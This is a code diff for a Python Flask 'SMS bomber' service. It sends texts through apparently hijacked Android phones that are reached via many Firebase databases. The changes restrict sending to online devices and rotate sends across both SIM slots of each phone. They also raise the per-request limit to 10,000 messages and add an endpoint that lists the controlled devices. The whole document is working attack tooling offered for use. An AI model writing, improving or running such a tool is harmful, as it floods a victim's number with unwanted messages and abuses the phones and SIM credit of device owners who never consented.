@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
 SMS BOMBER API - Render.com Deployment
-ALL 127+ Firebase Databases - SIM 1 & 2 Support
+ONLINE DEVICES ONLY - DUAL SIM - 100 SMS LIMIT
+127+ Firebase Databases
 Developer: @noobsater
 """
 
@@ -170,7 +171,7 @@ FIREBASE_CONFIGS = [
 # ===== CONFIGURATION =====
 # ============================================================
 
-MAX_SMS_PER_DEVICE = 100
+MAX_SMS_PER_SIM = 100
 device_usage = {}
 
 # ============================================================
@@ -191,18 +192,25 @@ def safe_int(value):
 def get_today():
     return datetime.now().strftime("%Y-%m-%d")
 
-def can_send(device_id):
-    key = f"{device_id}_{get_today()}"
-    return device_usage.get(key, 0) < MAX_SMS_PER_DEVICE
+def get_usage_key(device_id, sim):
+    return f"{device_id}_sim{sim}_{get_today()}"
 
-def increment_usage(device_id):
-    key = f"{device_id}_{get_today()}"
+def can_send(device_id, sim):
+    key = get_usage_key(device_id, sim)
+    return device_usage.get(key, 0) < MAX_SMS_PER_SIM
+
+def increment_usage(device_id, sim):
+    key = get_usage_key(device_id, sim)
     device_usage[key] = device_usage.get(key, 0) + 1
+
+def get_remaining(device_id, sim):
+    key = get_usage_key(device_id, sim)
+    return MAX_SMS_PER_SIM - device_usage.get(key, 0)
 
 # ============================================================
 
 def fetch_devices(config):
-    """Fetch devices from a single Firebase"""
+    """Fetch ONLY online devices from Firebase"""
     url = f"{config['url']}/clients.json?auth={config['auth']}"
     try:
         response = requests.get(url, timeout=10)
@@ -213,14 +221,13 @@ def fetch_devices(config):
             return []
         devices = []
         for client_id, info in data.items():
-            # Check if online - status or battery
+            # ONLINE CHECK
             is_online = info.get('status') == True or safe_int(info.get('battery')) > 0
             if is_online:
                 devices.append({
                     "id": client_id,
                     "firebase": config['name'],
-                    "config": config,
-                    "sim": info.get('sim') or info.get('sim1') or info.get('sim2') or 1
+                    "config": config
                 })
         return devices
     except:
@@ -235,8 +242,7 @@ def fetch_all_devices():
     return all_devices
 
 def send_sms(config, client_id, to_number, message, sim=1):
-    """Send SMS using a device with SIM support"""
-    # Match the exact format from your request
+    """Send SMS using a device with specific SIM"""
     url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
     payload = {
         "sim": sim,
@@ -247,7 +253,7 @@ def send_sms(config, client_id, to_number, message, sim=1):
     try:
         response = requests.put(url, json=payload, timeout=10)
         if response.status_code in [200, 201, 204]:
-            increment_usage(client_id)
+            increment_usage(client_id, sim)
             return True
         return False
     except:
@@ -269,7 +275,9 @@ def home():
 ║  📊 FEATURES:                                          ║
 ║                                                         ║
 ║  ✅ {len(FIREBASE_CONFIGS)} Firebase Databases           ║
-║  ✅ {MAX_SMS_PER_DEVICE} SMS per device per day        ║
+║  ✅ ONLY Online devices                                ║
+║  ✅ Dual SIM (1 & 2)                                  ║
+║  ✅ {MAX_SMS_PER_SIM} SMS per SIM per day              ║
 ║  ✅ Auto-rotate devices                                ║
 ║                                                         ║
 ╠═══════════════════════════════════════════════════════════╣
@@ -285,9 +293,10 @@ def status_api():
     return jsonify({
         "success": True,
         "timestamp": datetime.now().isoformat(),
-        "total_devices": len(all_devices),
+        "total_online_devices": len(all_devices),
         "firebases": len(FIREBASE_CONFIGS),
-        "limit_per_device": MAX_SMS_PER_DEVICE,
+        "limit_per_sim": MAX_SMS_PER_SIM,
+        "device_usage": device_usage,
         "developer": "@noobsater",
         "channel": "t.me/noob11001"
     })
@@ -297,31 +306,63 @@ def send_sms_api():
     number = request.args.get('number')
     message = request.args.get('msg')
     count = int(request.args.get('count') or 1)
-    sim = int(request.args.get('sim') or 1)  # SIM 1 or 2
     
     if not number or not message:
         return jsonify({"success": False, "error": "Number and message required!"}), 400
     
-    max_count = min(count, 1000)
+    max_count = min(count, 10000)
     all_devices = fetch_all_devices()
     
     if not all_devices:
         return jsonify({
             "success": False,
-            "error": "No devices found!",
+            "error": "No online devices found!",
             "firebases": len(FIREBASE_CONFIGS)
         }), 404
     
-    sent, failed = 0, 0
+    # Create tasks with rotation and dual SIM
+    tasks = []
+    sims = [1, 2]  # Both SIM slots
     
-    def worker(device):
+    for device in all_devices:
+        for sim in sims:
+            if can_send(device['id'], sim):
+                tasks.append({
+                    "device": device,
+                    "sim": sim
+                })
+    
+    if not tasks:
+        return jsonify({
+            "success": False,
+            "error": "All SIMs exhausted! Limit: 100 per SIM per day",
+            "limit": MAX_SMS_PER_SIM,
+            "total_devices": len(all_devices)
+        }), 429
+    
+    # Shuffle for rotation
+    random.shuffle(tasks)
+    
+    # Limit to requested count
+    tasks = tasks[:max_count]
+    
+    sent, failed = 0, 0
+    sim_stats = {"sim1": 0, "sim2": 0}
+    
+    def worker(task):
+        device = task["device"]
+        sim = task["sim"]
         success = send_sms(device['config'], device['id'], number, message, sim)
-        return success
+        return success, sim
     
     with ThreadPoolExecutor(max_workers=10) as ex:
-        for success in ex.map(worker, all_devices[:max_count]):
+        for success, sim in ex.map(worker, tasks):
             if success:
                 sent += 1
+                if sim == 1:
+                    sim_stats["sim1"] += 1
+                else:
+                    sim_stats["sim2"] += 1
             else:
                 failed += 1
     
@@ -329,11 +370,12 @@ def send_sms_api():
         "success": sent > 0,
         "target": number,
         "message": message,
-        "sim": sim,
         "requested": max_count,
         "sent": sent,
         "failed": failed,
-        "total_devices": len(all_devices),
+        "total_online_devices": len(all_devices),
+        "sim_stats": sim_stats,
+        "limit_per_sim": MAX_SMS_PER_SIM,
         "firebases": len(FIREBASE_CONFIGS),
         "developer": "@noobsater",
         "channel": "t.me/noob11001"
@@ -344,6 +386,17 @@ def reset_api():
     global device_usage
     device_usage = {}
     return jsonify({"success": True, "message": "Reset done!"})
+
+@app.route('/debug')
+def debug_api():
+    """Debug endpoint - see raw devices"""
+    all_devices = fetch_all_devices()
+    return jsonify({
+        "success": True,
+        "total": len(all_devices),
+        "devices": all_devices[:20],
+        "firebases": len(FIREBASE_CONFIGS)
+    })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
